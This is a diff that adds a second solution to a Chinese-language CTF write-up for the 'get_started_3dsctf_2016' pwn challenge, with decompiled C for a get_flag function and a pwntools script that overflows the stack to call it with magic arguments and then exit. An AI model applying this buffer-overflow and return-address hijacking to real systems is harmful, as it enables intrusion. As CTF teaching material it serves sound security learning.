@@ -77,3 +77,66 @@ payload += p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32
 payload += p32(int_80)
 ```
 
+
+
+解法二：
+其实我们还可以发现程序里还有一个get_flag函数
+
+```c
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // eax
+  int v3; // esi
+  unsigned __int8 v4; // al
+  int v5; // ecx
+  unsigned __int8 v6; // al
+
+  if ( a1 == 814536271 && a2 == 425138641 )
+  {
+    v2 = fopen("flag.txt", "rt");
+    v3 = v2;
+    v4 = getc(v2);
+    if ( v4 != 255 )
+    {
+      v5 = (char)v4;
+      do
+      {
+        putchar(v5);
+        v6 = getc(v3);
+        v5 = (char)v6;
+      }
+      while ( v6 != 255 );
+    }
+    fclose(v3);
+  }
+}
+```
+
+简单来看，有个fopen("flag.txt", "rt"),while循环里有个putchar(v5);所以粗略来看，这个就是可以读取flag.txt文件的。  
+因此只要让get_flag函数的参数1为814536271，参数2为425138641就可以查看flag了。
+当然，为了保证能够正常打开文件并打印出来，最好**让get_flag的返回地址为exit函数**，以确保正常退出程序(无exit的话有异常不会回显)
+对应的exp程序如下：
+```python
+#!/bin/python
+from pwn import *
+context.log_level = 'debug'
+
+elf = ELF("./get_started_3dsctf_2016")
+get_flag = elf.symbols["get_flag"]
+elf_exit = elf.symbols["exit"]
+a1 = 0x308cd64f
+a2 = 0x195719d1
+
+local = 1
+if local == 1:
+  io = process("./get_started_3dsctf_2016")
+else:
+  io = remote("node5.buuoj.cn",29568)
+ 
+payload = b'a' * 0x38
+payload += p32(get_flag) + p32(elf_exit)
+payload += p32(a1) + p32(a2)
+io.sendline(payload)
+io.recv()
+
+```
